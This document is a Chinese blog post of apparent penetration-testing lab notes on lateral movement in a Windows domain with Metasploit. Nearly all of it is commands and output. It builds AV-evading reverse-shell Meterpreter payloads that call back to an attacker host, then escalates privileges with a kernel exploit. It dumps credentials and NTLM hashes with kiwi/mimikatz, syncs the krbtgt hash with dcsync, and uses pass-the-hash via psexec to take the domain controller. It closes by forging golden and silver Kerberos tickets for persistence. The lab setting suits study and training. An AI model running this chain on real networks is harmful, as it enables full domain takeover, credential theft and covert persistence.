---
draft: false
isCJKLanguage: true
date: 2023-03-25
lastmod: 2023-03-25
title: "使用 MSF 进行 PtH 和 PtT"
description: 我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。
categories: 
  - Pentest
tags:
  - intranet
---


### 0x00 概述

* 环境

    攻击机 MSF：172.20.10.2  
    DC (Server2008R2X64)：10.11.11.5  
    目标机 (Win7ProX86)：10.11.11.14

* PtH 和 PtT

    PtH 一般用来进行域内横向  
    PtT 一般是在已经获取域控的前提下利用，用来做权限维持


### 0x01 前期准备

* 生成 payload

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.10.2 LPORT=4444 -b '\x00\x0a\xff' --platform windows -a x86  -e x86/shikata_ga_nai -i 5  -f exe -o 86.exe

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.10.2 LPORT=4444 -b '\x00' --platform windows -a x64  -e x64/xor -i 5  -f exe -o 64.exe

    # -p 指定 payload (用 msfvenom -l payloads 可查看所有 payload)
    # -a 指定目标指令集架构
    # -e 指定用什么编码器编码(多次编码变幻可以免杀，用 msfvenom -l encoders 可查看编码类型)
    # -i 指定编码迭代的次数
    # --platform 执行目标的平台
    # -f 指定输出格式，可用 msfvenom --help-formats查看
    ```

* 配置监听

    ExitOnSession 在接收到 seesion 后继续监听端口，防止假死与假 session  
    SessionCommunicationTimeout 默认情况下，会话在 5 分钟没有任何活动会被杀死，可将此项修改为 0  
    SessionExpirationTimeout 默认情况下，一个星期后，会话将被强制关闭，修改为0可永久不会被关闭  
    EnableStageEncoding 用来设置二级有效负载是否进行编码  
    StageEncoder 指定编码器类型  
    StageEncoder 指定的编码器对有效负载编码时失败后，是否回退到默认编码器（例如 x86/shikata_ga_nai）。如果将 set StageEncodingFallback 设置为 false，则在编码失败时将不会回退到默认编码器。这可以帮助确保有效负载编码的一致性和可靠性。  
    exploit -j -z -j 为后台任务，-z 为成功后不主动发送 stage

    ```bash
    msf > use exploit/multi/handler
    msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set LHOST 0.0.0.0
    msf exploit(multi/handler) > set LPORT 4444
    msf exploit(multi/handler) > set ExitOnSession false
    msf exploit(multi/handler) > set SessionCommunicationTimeout 36000
    msf exploit(multi/handler) > set SessionExpirationTimeout 36000
    // msf exploit(multi/handler) > set EnableStageEncoding true
    // msf exploit(multi/handler) > set StageEncoder x64/xor
    // msf exploit(multi/handler) > set StageEncodingFallback false
    msf exploit(multi/handler) > exploit -j -z
    [*] Exploit running as background job 0.
    [*] Started reverse TCP handler on 0.0.0.0:4444

    msf exploit(multi/handler) > jobs

    Jobs
    ====

    Id  Name                    Payload                          Payload opts
    --  ----                    -------                          ------------
    0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:4444
    ```

### 0x02 目标机反弹 shell
* 在目标主机上执行生成的 payload：86.exe，收到 shell

    ```bash
    msf6 exploit(multi/handler) >
    [*] Sending stage (175686 bytes) to 172.20.10.2
    [*] Meterpreter session 1 opened (172.20.10.2:4444 -> 172.20.10.2:60181) at 2023-03-06 12:31:17 +0800

    msf6 exploit(multi/handler) > sessions

    Active sessions
    ===============

    Id  Name  Type                     Information              Connection
    --  ----  ----                     -----------              ----------
    1         meterpreter x86/windows  TEST\zhangsan @ WIN7PRO  172.20.10.2:4444 -> 172.20.10.14:60997 (172.20.10.14)

    msf6 exploit(multi/handler) > sessions 1
    [*] Starting interaction with 1...

    meterpreter > getuid
    Server username: TEST\zhangsan
    ```

* 进程迁移

    将进程迁移到了资源管理器，防止目标通过任务管理器或者使用 tasklist 看到我们的进程。  
    一般注入 svchost.exe、explorer.exe、lsass.exe、services.exe、winlogon.exe、rundll32.exe、taskhost.exe、spoolsv.exe

    ```bash
    meterpreter > ps

    Process List
    ============

    PID   PPID  Name               Arch  Session  User           Path
    ---   ----  ----               ----  -------  ----           ----
    0     0     [System Process]
    4     0     System
    272   4     smss.exe
    444   384   winlogon.exe
    504   396   lsass.exe
    692   832   dwm.exe            x86   1        TEST\zhangsan  C:\Windows\system32\Dwm.exe
    808   1272  explorer.exe       x86   1        TEST\zhangsan  C:\Windows\Explorer.EXE
    1548  488   kms-server.exe
    1964  488   taskhost.exe       x86   1        TEST\zhangsan  C:\Windows\system32\taskhost.exe
    2072  2748  msiexec.exe        x86   1                       C:\Windows\System32\msiexec.exe

    meterpreter > migrate 808
    [*] Migrating from 2748 to 808...
    [*] Migration completed successfully.

    meterpreter > background
    [*] Backgrounding session 1...
    ```

* 进行提权

    通过 local_exploit_suggester 获取 msf 建议的 exploit

    ```bash
    msf6 exploit(multi/handler) > run post/multi/recon/local_exploit_suggester
    msf6 post(multi/recon/local_exploit_suggester) > set session 1
    msf6 post(multi/recon/local_exploit_suggester) > run

    [*] 172.20.10.2 - Collecting local exploits for x86/windows...
    [*] 172.20.10.2 - 168 exploit checks are being tried...
    [+] 172.20.10.2 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
    [+] 172.20.10.2 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
    [+] 172.20.10.2 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
    [+] 172.20.10.2 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
    [*] Running check method for exploit 41 / 41
    [*] 172.20.10.2 - Valid modules for session 3:
    ============================

    #   Name                                                           Potentially Vulnerable?  Check Result
    -   ----                                                           -----------------------  ------------
    1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
    2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
    3   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
    4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
    5   exploit/windows/local/bthpan                                    No                       The target is not exploitable.
    。。。。
    。。。。

    [*] Post module execution completed
    ```

    利用 msf 建议的 exploit 进行提权

    ```bash
    msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
    msf6 exploit(exploit/windows/local/ms10_015_kitrap0d) > set session 1
    msf6 exploit(windows/local/ms10_015_kitrap0d) > run

    [*] Started reverse TCP handler on 172.20.10.2:4444
    [*] Reflectively injecting payload and triggering the bug...
    [*] Launching msiexec to host the DLL...
    [+] Process 2072 launched.
    [*] Reflectively injecting the DLL into 2072...
    [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
    [*] Sending stage (175686 bytes) to 172.20.10.2
    [*] Meterpreter session 2 opened (172.20.10.2:4444 -> 172.20.10.14:61686) at 2023-03-06 12:40:02 +0800

    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    meterpreter > shell
    Process 680 created.
    Channel 2 created.
    Microsoft Windows [�汾 6.1.7600]
    ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ��

    C:\Users\zhangsan\Desktop>chcp 65001
    chcp 65001
    Active code page: 65001

    C:\Users\zhangsan\Desktop>net group "domain admins" /domain
    net group "domain admins" /domain
    The request will be processed at a domain controller for domain test.com.

    Group name     Domain Admins
    Comment        ָ���������Ա

    Members

    -------------------------------------------------------------------------------
    admin                    Administrator
    The command completed successfully.

    C:\Users\zhangsan\Desktop>exit
    exit
    meterpreter > background
    [*] Backgrounding session 2...
    msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions

    Active sessions
    ===============

    Id  Name  Type                     Information                    Connection
    --  ----  ----                     -----------                    ----------
    1         meterpreter x86/windows  TEST\zhangsan @ WIN7PRO        172.20.10.2:4444 -> 172.20.10.14:60181 (172.20.10.14)
    2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN7PRO  172.20.10.2:4444 -> 172.20.10.14:61686 (172.20.10.14)
    ```

### 0x03 进行 Hash 传递攻击(PtH)

* 首先通过域内用户 SYSTEM 权限得到 ntlm hash

    ```bash
    msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions 2
    [*] Starting interaction with 2...
    meterpreter > load kiwi
    meterpreter > kiwi_cmd sekurlsa::logonpasswords

    Authentication Id : 0 ; 405357 (00000000:00062f6d)
    Session           : CachedInteractive from 1
    User Name         : Administrator
    Domain            : TEST
    Logon Server      : WIN-2008
    Logon Time        : 2023/3/5 21:06:10
    SID               : S-1-5-21-3160176211-3702513722-812664031-500
        msv :
        [00000003] Primary
        * Username : Administrator
        * Domain   : TEST
        * LM       : f26fb3ae03e93ab913328873c0db4945
        * NTLM     : 0e032b9d51a580ac6cdfabad8bc97a38
        * SHA1     : c17a16040770e68ea65ce528b5f503dba3663d16
        ......
        ......

    Authentication Id : 0 ; 136194 (00000000:00021402)
    Session           : Interactive from 1
    User Name         : zhangsan
    Domain            : TEST
    Logon Server      : WIN-2008
    Logon Time        : 2023/3/5 20:31:02
    SID               : S-1-5-21-3160176211-3702513722-812664031-1118
        msv :
        [00000003] Primary
        * Username : zhangsan
        * Domain   : TEST
        * LM       : 1c27b75762feeeb3e72c57ef50f76a05
        * NTLM     : 993ca38cf7795d31bc429a8b9903a01a
        * SHA1     : 491010a4fb3715098e98c855175c841ac2d1badc
        ......
        ......
    ```

    查看域内管理员组用户

    ```bash
    meterpreter > shell
    Process 716 created.
    Channel 3 created.
    Microsoft Windows [�汾 6.1.7600]
    ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ��

    C:\Users\zhangsan\Desktop>chcp 65001
    chcp 65001
    Active code page: 65001

    C:\Users\zhangsan\Desktop>net group "domain admins" /domain
    net group "domain admins" /domain
    The request will be processed at a domain controller for domain test.com.

    Members

    -------------------------------------------------------------------------------
    admin                    Administrator
    The command completed successfully.
    meterpreter > background
    [*] Backgrounding session 2...
    ```

* 进行 pth 获取 DC 的权限

    使用域内管理员组用户的 hash，这里用 admin 这个用户

    ```bash
    msf6 exploit(windows/local/ms10_015_kitrap0d) > use exploit/windows/smb/psexec
    msf6 exploit(windows/smb/psexec) > options

    Module options (exploit/windows/smb/psexec):

    Name                  Current Setting                    Required  Description
    ----                  ---------------                    --------  -----------
    RHOSTS                10.11.11.5                         yes       The target host(s), see https://docs.metasploit.com/docs/usi
                                                                        ng-metasploit/basics/using-metasploit.html
    RPORT                 445                                yes       The SMB service port (TCP)
    SERVICE_DESCRIPTION                                      no        Service description to be used on target for pretty listing
    SERVICE_DISPLAY_NAME                                     no        The service display name
    SERVICE_NAME                                             no        The service name
    SMBDomain             test.com                           no        The Windows domain to use for authentication
    SMBPass               00000000000000000000000000000000:  no        The password for the specified username
                          209c6174da490caeb422f3fa5a7ae634
    SMBSHARE                                                 no        The share to connect to, can be an admin share (ADMIN$,C$,..
                                                                        .) or a normal read/write folder share
    SMBUser               admin                              no        The username to authenticate as


    Payload options (windows/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     172.20.10.2      yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port


    Exploit target:

    Id  Name
    --  ----
    0   Automatic

    View the full module info with the info, or info -d command.

    msf6 exploit(windows/smb/psexec) > run

    [*] Started reverse TCP handler on 172.20.10.2:4444
    [*] 10.11.11.5:445 - Connecting to the server...
    [*] 10.11.11.5:445 - Authenticating to 10.11.11.5:445|test.com as user 'admin'...
    [*] 10.11.11.5:445 - Selecting native target
    [*] 10.11.11.5:445 - Uploading payload... qusizJPL.exe
    [*] 10.11.11.5:445 - Created \qusizJPL.exe...
    [+] 10.11.11.5:445 - Service started successfully...
    [*] Sending stage (175686 bytes) to 172.20.10.2
    [*] 10.11.11.5:445 - Deleting \qusizJPL.exe...
    [*] Meterpreter session 7 opened (172.20.10.2:4444 -> 172.20.10.5:65265) at 2023-03-06 14:28:01 +0800

    meterpreter > ifconfig

    Interface 65539
    ============
    Name         : Parallels Ethernet Adapter
    Hardware MAC : 00:1c:42:5e:07:99
    MTU          : 1500
    IPv4 Address : 10.11.11.5
    IPv4 Netmask : 255.255.255.0
    ```

### 0x04 黄金票据

黄金票据是伪造 TGS，一般拿下域控后用来维权，因为 krbtgt 域账户的密码基本不会更改

* 利用条件
    * 域名称
    * 域 SID
    * krbtgt NTLM-Hash(需要拿下域控)

* 域内普通用户 shell 获取 DC 名称
    * 改编码

        ````bash
        C:\Windows\system32>chcp 65001
        chcp 65001
        Active code page: 65001
        ````
    * net config workstation | findstr domain 得到域名称

        ```bash
        C:\Users\zhangsan\Desktop>net config workstation | findstr domain
        net config workstation | findstr domain
        Workstation domain                   TEST
        Logon domain                         TEST
        ```
    * nltest /dsgetdc:TEST 得到 dc 主机名为 `\\WIN-2008`

        ```bash
        C:\Users\zhangsan\Desktop>nltest /dsgetdc:TEST
        nltest /dsgetdc:TEST
                   DC: \\WIN-2008
              Address: \\10.11.11.5
             Dom Guid: 319da0ce-39fd-4861-8e18-6a2264cfe874
             Dom Name: TEST
          Forest Name: test.com
         Dc Site Name: Default-First-Site-Name
        Our Site Name: Default-First-Site-Name
                Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS
        The command completed successfully
        ```
* 域内普通用户获取域 SID
    * kiwi_cmd token::whoami

        ```bash
        meterpreter > kiwi_cmd token::whoami
         * Process Token : {0;0001a410} 1 D 111721    	TEST\zhangsan	S-1-5-21-3160176211-3702513722-812664031-1118	(10g,05p)	Primary
         * Thread Token  : no token
        ```

    * whoami /user

        ```bash
        C:\Windows\system32>whoami /user
        whoami /user
        
        USER INFORMATION
        ----------------
        
        User Name     SID
        ============= =============================================
        test\zhangsan S-1-5-21-3160176211-3702513722-812664031-1118
        ```

    * wmic useraccount get name,sid

        ```bash
        C:\Users\zhangsan\Desktop>wmic useraccount get name,sid
        wmic useraccount get name,sid
        Name           SID
        Administrator  S-1-5-21-2772043085-310273303-638560154-500
        Guest          S-1-5-21-2772043085-310273303-638560154-501
        reber          S-1-5-21-2772043085-310273303-638560154-1000
        Administrator  S-1-5-21-3160176211-3702513722-812664031-500
        Guest          S-1-5-21-3160176211-3702513722-812664031-501
        krbtgt         S-1-5-21-3160176211-3702513722-812664031-502
        zhangsan       S-1-5-21-3160176211-3702513722-812664031-1118
        lisi           S-1-5-21-3160176211-3702513722-812664031-1126
        admin          S-1-5-21-3160176211-3702513722-812664031-1128
        ```

* 域内管理员组用户权限获取 krbtgt NTLM-Hash

    kiwi 模块同时支持 32 位和 64 位操作系统，默认加载是 32 位操作系统  
    如果当前 session 为 x86，dc 为 x64，则要先注入到 x64

    ```bash
    meterpreter > load kiwi
    Success.
    meterpreter > kiwi_cmd lsadump::dcsync /domain:test.com /all /csv
    502        krbtgt  3f92886413f9d4ab78e03c6275a71b85  514
    1127     WIN2003$  5ad1bf868f8ddbe900c15dfe82e6c08e  4096
    1008    WIN-2008$  f048fbe3fc1722d6a83388364dab9cdc  532480
    500 Administrator  0e032b9d51a580ac6cdfabad8bc97a38  512
    1118     zhangsan  993ca38cf7795d31bc429a8b9903a01a  66048
    1126         lisi  6447286bfde2f1ac790331e33b819657  66048
    1123    WIN7PRO2$  c4f03bb85e00c17788e8d9ee5c60aef0  4096
    1122     WIN7PRO$  2d688c9797ca9f14639c541f289479ed  4096
    1128        admin  209c6174da490caeb422f3fa5a7ae634  66048
    ```
* 域内管理员组用户权限生成票据

    ```bash
    meterpreter > golden_ticket_create -d test.com -s S-1-5-21-3160176211-3702513722-812664031 -k 3f92886413f9d4ab78e03c6275a71b85 -u abc -t /tmp/abc.kirbi
    ```

* 域内普通用户导入票据

    ```bash
    meterpreter > getuid
    Server username: TEST\zhangsan
    meterpreter > kerberos_ticket_purge
    [+] Kerberos tickets purged
    meterpreter > kerberos_ticket_use /tmp/abc.kirbi
    [*] Using Kerberos ticket stored in /tmp/abc.kirbi, 1820 bytes ...
    [+] Kerberos ticket applied successfully.
    meterpreter > kerberos_ticket_list
    [+] Kerberos tickets found in the current session.
    [00000000] - 0x00000017 - rc4_hmac_nt
       Start/End/MaxRenew: 2023/3/24 4:11:16 ; 2033/3/21 12:11:16 ; 2033/3/21 12:11:16
       Server Name       : krbtgt/test.com @ test.com
       Client Name       : abc @ test.com
       Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ;
    
    meterpreter > shell
    Process 3796 created.
    Channel 2 created.
    Microsoft Windows [�汾 6.1.7600]
    ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ��
    
    C:\Users\zhangsan\Desktop>chcp 65001
    chcp 65001
    Active code page: 65001
    
    C:\Users\zhangsan\Desktop>dir \\WIN-2008\C$
    dir \\WIN-2008\C$
     Volume in drive \\WIN-2008\C$ has no label.
     Volume Serial Number is B08C-EB53
    
     Directory of \\WIN-2008\C$
    
    2009/07/13  20:20    <DIR>          PerfLogs
    2018/07/26  21:51    <DIR>          Program Files
    2023/03/02  20:45    <DIR>          Program Files (x86)
    2017/09/12  20:49    <DIR>          Users
    2023/03/06  00:44    <DIR>          Windows
                   0 File(s)              0 bytes
                   5 Dir(s)  124,080,254,976 bytes free
    ```

### 0x05 白银票据

白银票据是伪造 TGS，不会经过 KDC，更加隐蔽，但权限就远不如黄金票据

* 可利用服务

    | 服务                 | 服务名           |
    |---------------------|-----------------|
    | WMI                 | HOST、RPCSS     |
    | PowerShell Remoting | HOST、HTTP      |
    | WinRM               | HOST、HTTP      |
    | Scheduled Tasks     | HOST           |
    | Windows File Share (CIFS) | CIFS      |
    | LDAP、DCSync        | LDAP |
    | Windows Remote Server | RPCSS、LDAP、CIFS |

* 利用条件
    * 域名称
    * 域 SID
    * 服务账号的 NTLM-Hash
    * 目标服务器 FQDN
    * 可利用的服务

* 域内用户 SYSTEM 权限获取域名称、SID、NTLM-Hash

    Domain       : TEST  
    User Server  : DC$  
    SID          : S-1-5-21-3160176211-3702513722-812664031  
    NTLM         : 993ca38cf7795d31bc429a8b9903a01a

    ```bash
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    meterpreter > load kiwi
    Success.
    meterpreter > kiwi_cmd sekurlsa::logonpasswords
    
    Authentication Id : 0 ; 996 (00000000:000003e4)
    Session           : Service from 0
    User Name         : DC$
    Domain            : TEST
    Logon Server      : (null)
    Logon Time        : 2023/3/25 10:42:15
    SID               : S-1-5-20
    	msv :
    	 [00000003] Primary
    	 * Username : DC$
    	 * Domain   : TEST
    	 * NTLM     : 993ca38cf7795d31bc429a8b9903a01a
    	 * SHA1     : 104c7eec951d84ce412bd21e123b67520688f570
    meterpreter > shell
    Process 2732 created.
    Channel 3 created.
    Microsoft Windows [�汾 6.1.7600]
    ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ��
    
    C:\Windows\system32>wmic useraccount get name,sid
    wmic useraccount get name,sid
    Name           SID
    Administrator  S-1-5-21-3160176211-3702513722-812664031-500
    Guest          S-1-5-21-3160176211-3702513722-812664031-501
    krbtgt         S-1-5-21-3160176211-3702513722-812664031-502
    zhangsan       S-1-5-21-3160176211-3702513722-812664031-1118
    lisi           S-1-5-21-3160176211-3702513722-812664031-1126
    admin          S-1-5-21-3160176211-3702513722-812664031-1128
    ```

* 域内普通用户权限直接导入票据

    ```bash
    meterpreter > getuid
    Server username: TEST\zhangsan
    meterpreter > kerberos_ticket_purge
    [+] Kerberos tickets purged
    meterpreter > kiwi_cmd kerberos::golden /domain:test.com /sid:S-1-5-21-3160176211-3702513722-812664031 /target:dc.test.com /service:cifs /rc4:993ca38cf7795d31bc429a8b9903a01a /user:abc /ptt
    User      : abc
    Domain    : test.com (TEST)
    SID       : S-1-5-21-3160176211-3702513722-812664031
    User Id   : 500
    Groups Id : *513 512 520 518 519
    ServiceKey: 993ca38cf7795d31bc429a8b9903a01a - rc4_hmac_nt
    Service   : cifs
    Target    : dc.test.com
    Lifetime  : 2023/3/24 22:30:08 ; 2033/3/21 22:30:08 ; 2033/3/21 22:30:08
    -> Ticket : ** Pass The Ticket **
    
     * PAC generated
     * PAC signed
     * EncTicketPart generated
     * EncTicketPart encrypted
     * KrbCred generated
    
    Golden ticket for 'abc @ test.com' successfully submitted for current session
    
    meterpreter > kerberos_ticket_list
    [+] Kerberos tickets found in the current session.
    [00000000] - 0x00000017 - rc4_hmac_nt
       Start/End/MaxRenew: 2023/3/24 22:30:08 ; 2033/3/21 22:30:08 ; 2033/3/21 22:30:08
       Server Name       : cifs/dc.test.com @ test.com
       Client Name       : abc @ test.com
       Flags 40a00000    : pre_authent ; renewable ; forwardable ;
    ```

    导入白银票据后可直接查看域控的 C 盘文件
    ```bash
    meterpreter > shell
    Process 2004 created.
    Channel 1 created.
    Microsoft Windows [�汾 6.1.7600]
    ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ��
    
    C:\Users\zhangsan\Desktop>chcp 65001
    chcp 65001
    Active code page: 65001
    
    C:\Users\zhangsan\Desktop>dir \\win-2008\c$
    dir \\win-2008\c$
     Volume in drive \\win-2008\c$ has no label.
     Volume Serial Number is B08C-EB53
    
     Directory of \\win-2008\c$
    
    2009/07/13  20:20    <DIR>          PerfLogs
    2018/07/26  21:51    <DIR>          Program Files
    2023/03/02  20:45    <DIR>          Program Files (x86)
    2017/09/12  20:49    <DIR>          Users
    2023/03/06  00:44    <DIR>          Windows
                   0 File(s)              0 bytes
                   5 Dir(s)  124,094,062,592 bytes free
    ```


#### Reference(侵删)：
* [https://www.cnblogs.com/howtime/p/12498608.html](https://www.cnblogs.com/howtime/p/12498608.html?_blank)
* [https://blog.csdn.net/weixin_60109175/article/details/123971841](https://blog.csdn.net/weixin_60109175/article/details/123971841?_blank)
* [https://txluck.github.io/2022/03/04/黄金票据和白银票据/](https://txluck.github.io/2022/03/04/黄金票据和白银票据/?_blank)
* [https://zhuanlan.zhihu.com/p/501491931](https://zhuanlan.zhihu.com/p/501491931?_blank)
